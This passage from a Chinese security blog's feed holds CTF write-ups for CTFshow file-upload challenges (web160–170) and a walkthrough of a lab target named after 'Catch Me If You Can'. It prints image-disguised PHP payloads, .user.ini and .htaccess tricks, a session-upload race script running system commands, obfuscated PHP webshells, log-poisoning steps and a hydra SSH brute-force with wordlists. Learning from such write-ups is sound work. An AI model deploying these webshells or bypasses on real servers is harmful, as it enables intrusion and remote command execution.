punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ext_suffix</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext_suffix</span><span class="token operator">!=</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string">"php"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                    <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"文件类型不合规"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/php|\{|\[|\;|log|\(| |\`/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>cnm.png中的内容为：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token keyword">include</span><span class="token string">"ph"</span><span class="token punctuation">.</span>"p<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=../flag.p"."hp"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>在160的基础上制作一个合格的图片马</p><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p><a href="https://blog.csdn.net/weixin_43915842/article/details/90183305" target="_blank" rel="noopener">文件上传漏洞之getimagesize()类型验证</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">GIF89A</span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token keyword">include</span><span class="token string">"ph"</span><span class="token punctuation">.</span>"p<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-encode/resource=../flag.p"."hp"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后访问upload下面的index.php就可以了</p><h2 id="web162-163"><a href="#web162-163" class="headerlink" title="web162-163"></a>web162-163</h2><p>考查点是session文件包含，因为有session_upload_process.cleanup存在，所以需要竞争一下</p><p>继续构造.user.ini文件</p><pre><code>GIF89Aauto_prepend_file=&quot;png&quot;</code></pre><p>session文件默认储存路径</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里需要木马文件的名字为png</p><pre class="line-numbers language-php"><code class="language-php">GIF89a<span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token keyword">include</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>sess_yn8rt<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者直接.user.ini</p><pre><code>GIF89aauto_append_file=/tmp/sess_yn8rt</code></pre><p>然后利用脚本发包(本人试验失败，并且用bp也失败了)</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> io<span class="token comment" spellcheck="true">#io库</span><span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#requests路</span><span class="token keyword">import</span> threading<span class="token comment" spellcheck="true">#多线程库</span>url <span class="token operator">=</span> <span class="token string">'http://2f7dadc0-f18d-41db-b727-61fd89b2d983.challenge.ctf.show:8080/'</span>sessid <span class="token operator">=</span> <span class="token string">'yn8rt'</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#写入函数</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#当事件开启</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">256</span><span class="token punctuation">)</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#post形式访问</span>            url<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#url不变</span>            cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#cookies赋值</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span><span class="token string">'&lt;?php system("cat /f*");?>'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#文件内容</span>            files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'harker.txt'</span><span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#文件形式</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#读取函数</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#当事件开启</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'upload/index.php'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sessid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#以get形式访问</span>        <span class="token keyword">if</span> <span class="token string">'ctfshow'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#如果存在flag则打印出内容</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#关闭事件</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出NO</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#定义事件</span>    event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#开启事件</span>    <span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 上下文管理，可以处理异常</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 开启线程</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>write<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 开启线程</span>            threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web164-165（不弄）"><a href="#web164-165（不弄）" class="headerlink" title="web164-165（不弄）"></a>web164-165（不弄）</h2><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><h3 id="考点：针对zip文件校验"><a href="#考点：针对zip文件校验" class="headerlink" title="考点：针对zip文件校验"></a>考点：针对zip文件校验</h3><p>Content-Type: application/x-zip-compressed</p><p>然后zip抓包直接写入一句话木马，蚁剑连接就行</p><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><h3 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h3><p>.htaccess文件：</p><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。<br>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><pre><code>AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</code></pre><pre><code>&lt;FilesMatch &quot;666.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"s#y#s#t#e#m"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'ystem'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token string">'metsys'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web169-170"><a href="#web169-170" class="headerlink" title="web169-170"></a>web169-170</h2><p>利用.user.ini</p><p>进行UA头的日志文件包含</p><pre><code>auto_append_file=“/var/log/nginx/access.log”</code></pre><p>此处需要上传zip文件，然后type类型为image/png，有点扯淡</p><p>然后上传1.php时修改UA写马，然后蚁剑连接/upload/1.php就可以了</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF之猫鼠游戏</title>
      <link href="/2021/06/16/ctf-zhi-mao-shu-you-xi/"/>
      <url>/2021/06/16/ctf-zhi-mao-shu-you-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>目标发现：</p><pre><code>nmap -sP 192.168.10.0/24</code></pre><h3 id="Flag-1-“Don’t-go-Home-Frank-There’s-a-Hex-on-Your-House”"><a href="#Flag-1-“Don’t-go-Home-Frank-There’s-a-Hex-on-Your-House”" class="headerlink" title="Flag#1 - “Don’t go Home Frank! There’s a Hex on Your House”"></a>Flag#1 - “Don’t go Home Frank! There’s a Hex on Your House”</h3><p>核心单词为home和hex，也就是在主页有16进制编码的字符串需要你来找，主要搜索目标为js文件</p><p>根据源代码里面的注释掉的提示：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">[</span>If IE4<span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"/oldIE/html5.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>Make sure to remove <span class="token keyword">this</span> before going to PROD<span class="token punctuation">]</span><span class="token operator">--</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在网页后面跟踪/oldIE/html5.js得到一串密文：</p><pre><code>666c61677b37633031333230373061306566373164353432363633653964633166356465657d</code></pre><p>然后进行解码得到：</p><pre><code>echo &#39;666c61677b37633031333230373061306566373164353432363633653964633166356465657d&#39; | xxd -r(解码) -p(输出)flag{7c0132070a0ef71d542663e9dc1f5dee}md5处理flag{nmap}</code></pre><h3 id="Flag-2-“Obscurity-or-Security-That-is-the-Question”-隐晦或者安全，这是一个问题"><a href="#Flag-2-“Obscurity-or-Security-That-is-the-Question”-隐晦或者安全，这是一个问题" class="headerlink" title="Flag#2 - “Obscurity or Security? That is the Question”(隐晦或者安全，这是一个问题)"></a>Flag#2 - “Obscurity or Security? That is the Question”(隐晦或者安全，这是一个问题)</h3><p>利用nmap针对此网站进行端口扫描</p><pre><code>nmap -sT -sV(前面需要有sT来检查开放了哪些端口) -p-(所有端口的另一种表示) 192.168.10.129</code></pre><p>得到80、443、22222端口是开的，而443端口是针对安全的远程超文本传输协议也就是https，这里的22222端口为ssh可以尝试</p><pre><code>ssh 192.168.10.129 -p 22222</code></pre><p>告诉我只允许fbi成员才可以访问同时也得到</p><pre><code>Flag{53c82eba31f6d416f331de9162ebe997}encrypt(加密)</code></pre><h3 id="Flag-3-“Becare-agent-during-his-Travels-Frank-has-Been-Known-to-Intercept-Traffic”-注意证据在他的旅行中，弗兰克以拦截交通而闻名"><a href="#Flag-3-“Becare-agent-during-his-Travels-Frank-has-Been-Known-to-Intercept-Traffic”-注意证据在他的旅行中，弗兰克以拦截交通而闻名" class="headerlink" title="Flag#3 - “Becare agent during his Travels Frank has Been Known to Intercept Traffic”(注意证据在他的旅行中，弗兰克以拦截交通而闻名)"></a>Flag#3 - “Becare agent during his Travels Frank has Been Known to Intercept Traffic”(注意证据在他的旅行中，弗兰克以拦截交通而闻名)</h3><p>重点在拦截上，也就是利用burpsuite来抓包了，并且提示agent</p><p>通过上一个flag的加密提示和凭证，可以猜测到ssl证书，也就是HTTPS协议中的ssl证书，然后进行远程超文本加密协议的访问发现ssl证书是不安全的，查看证书后发现了flag</p><pre><code>flag3{f82366a9ddc064585d54e3f78bde3221}personnel(人员)</code></pre><p>抓包在这里没起到作用可能猜想有错误</p><h3 id="Flag-4-“A-Good-Agent-is-Hard-to-Find”-一个好的证据是很难发现的"><a href="#Flag-4-“A-Good-Agent-is-Hard-to-Find”-一个好的证据是很难发现的" class="headerlink" title="Flag#4 - “A Good Agent is Hard to Find”(一个好的证据是很难发现的)"></a>Flag#4 - “A Good Agent is Hard to Find”(一个好的证据是很难发现的)</h3><p>需要利用personnel(个人信息)</p><p>访问网站的子目录personnel得到：ACCESS DENIED!!! You Do Not Appear To Be Coming From An FBI Workstation. Preparing Interrogation Room 1. Car Batteries Charging….(拒绝访问！！！ 您似乎不是来自 FBI 工作站。 准备审讯室 1. 汽车电池充电…. )</p><p>这里需要FBI为访问UA</p><p>通过html5.js继续收集信息得到</p><pre><code>/* maindev -  6/7/02 Adding temporary(暂时的) support for IE4 FBI Workstations */</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8816%E6%97%A51516_1.png" alt></p><p>修改UA信息为Mozilla/4.0 (compatible; MSIE 4.0; Windows NT 5.0)</p><p>然后再次放行就可以得到新的页面了得到</p><pre><code>flag{14e10d570047667f904261e6d08f520f}Clue(线索) = new+flagevidence(证据)</code></pre><h3 id="Flag-5-“The-Devil-is-in-the-Details-Or-is-it-Dialogue-Either-Way-if-it’s-Simple-Guessable-or-Personal-it-Goes-Against-Best-Practices”-魔鬼在细节中——还是对话？-无论哪种方式，如果它是简单的、可猜测的或个性化的，它就会违背最佳实践"><a href="#Flag-5-“The-Devil-is-in-the-Details-Or-is-it-Dialogue-Either-Way-if-it’s-Simple-Guessable-or-Personal-it-Goes-Against-Best-Practices”-魔鬼在细节中——还是对话？-无论哪种方式，如果它是简单的、可猜测的或个性化的，它就会违背最佳实践" class="headerlink" title="Flag#5 - “The Devil is in the Details - Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices”(魔鬼在细节中——还是对话？ 无论哪种方式，如果它是简单的、可猜测的或个性化的，它就会违背最佳实践 )"></a>Flag#5 - “The Devil is in the Details - Or is it Dialogue? Either Way, if it’s Simple, Guessable, or Personal it Goes Against Best Practices”(魔鬼在细节中——还是对话？ 无论哪种方式，如果它是简单的、可猜测的或个性化的，它就会违背最佳实践 )</h3><p>new+flag=newevidence</p><p>访问新证据子目录得到对话框</p><p>抓包爆破密码(已经给出字典了)：carl.hanratty:Grace</p><p>成功进入</p><pre><code>flag{117c240d49f54096413dd64280399ea9}panam(钱)</code></pre><h3 id="Flag-6-“Where-in-the-World-is-Frank-”"><a href="#Flag-6-“Where-in-the-World-is-Frank-”" class="headerlink" title="Flag#6 - “Where in the World is Frank?”"></a>Flag#6 - “Where in the World is Frank?”</h3><p>利用得到的图片进行steghide处理</p><p>使用steghide命令分析图片，命令格式如下：steghide info xxx.jpg</p><p>密码就是panam得到新的</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E9%98%BF%E8%90%A8%E5%BE%B7%E7%BE%A4%E7%BF%81.jpg" alt></p><h3 id="Flag-7-“Frank-Was-Caught-on-Camera-Cashing-Checks-and-Yelling-I’m-The-Fastest-Man-Alive-”-弗兰克被摄像机抓到兑现支票并大喊大叫-我是活着最快的人！"><a href="#Flag-7-“Frank-Was-Caught-on-Camera-Cashing-Checks-and-Yelling-I’m-The-Fastest-Man-Alive-”-弗兰克被摄像机抓到兑现支票并大喊大叫-我是活着最快的人！" class="headerlink" title="Flag#7 - “Frank Was Caught on Camera Cashing Checks and Yelling - I’m The Fastest Man Alive!”(弗兰克被摄像机抓到兑现支票并大喊大叫 - 我是活着最快的人！)"></a>Flag#7 - “Frank Was Caught on Camera Cashing Checks and Yelling - I’m The Fastest Man Alive!”(弗兰克被摄像机抓到兑现支票并大喊大叫 - 我是活着最快的人！)</h3><p>百度，得到答案是闪电侠：Barry.Allen</p><p>利用此名字frank组成爆破字典：</p><pre><code>barryallenbarry.allenBaryy.AllenBarryAllenbarryallenBarryAllencarl.hanrattyCarl.HanrattycarlhanrattycarlhanrattyCarlHanrattyFrank.Abagnalefrank.abagnalefrankabagnaleFrankAbagnalefrankabagnale</code></pre><p>passwd：</p><pre><code>iheartbrendabarryallenbarry.allenBaryy.AllenBarryAllenbarryallenBarryAllencarl.hanrattyCarl.HanrattycarlhanrattycarlhanrattyCarlHanrattyFrank.Abagnalefrank.abagnalefrankabagnaleFrankAbagnalefrankabagnalepanamILoveFrance </code></pre><p>然后利用<a href="https://www.cnblogs.com/daiorz/p/11803131.html" target="_blank" rel="noopener">hydra实现爆破</a>：</p><p>hydra -L (指定多个用户名，参数值为存储用户名的文件的路径(建议为绝对路径)-P(指定单个密码，适合在知道密码爆破用户名时使用)-s(指定端口，适用于攻击目标端口非默认的情况。例如：http服务使用非80端口)22222 192.168.10.129 ssh</p><p>得到用户名和密码：barryallen&amp;iheartbrenda</p><p>然后ssh连接到目标靶机得到：</p><p>flag{bd2f6a1d5242c962a05619c56fa47ba6}</p><p>theflash(闪电侠)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>木马免杀</title>
      <link href="/2021/06/16/webshell-mian-sha/"/>
      <url>/2021/06/16/webshell-mian-sha/</url>
      
